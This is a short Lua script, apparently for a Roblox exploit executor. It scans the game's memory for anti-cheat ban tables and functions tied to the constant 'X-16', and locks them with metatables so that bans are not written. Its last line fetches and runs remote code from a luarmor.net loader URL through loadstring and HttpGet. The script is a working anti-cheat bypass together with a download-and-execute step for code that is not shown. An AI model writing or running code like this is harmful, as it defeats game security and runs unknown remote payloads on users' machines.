for _, Table in getgc(true) do
    if typeof(Table) ~= "table" then continue end
    if getrawmetatable(Table) then continue end
    local IsCircular = false
    for _, v in Table do
        if typeof(v) == "table" and Table == v then
            IsCircular = true
            break
        end
    end
    if not IsCircular then continue end
    local BanIndex
    for _, v in Table do
        if typeof(v) ~= "number" then continue end
        for i = 1, 3 do
            if v == i then BanIndex = i break end
        end
        if BanIndex then break end
    end
    if BanIndex and Table[BanIndex] == nil then
        setrawmetatable(Table, { __newindex = function() end })
    end
end
for _, fn in filtergc("function", { Constants = {"X-16"} }) do
    for i, upval in debug.getupvalues(fn) do
        pcall(setmetatable, upval, { __newindex = function() end })
    end
end
task.wait(10)
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/24b5bd3aa14490d03cb0f5f52030a107.lua"))()
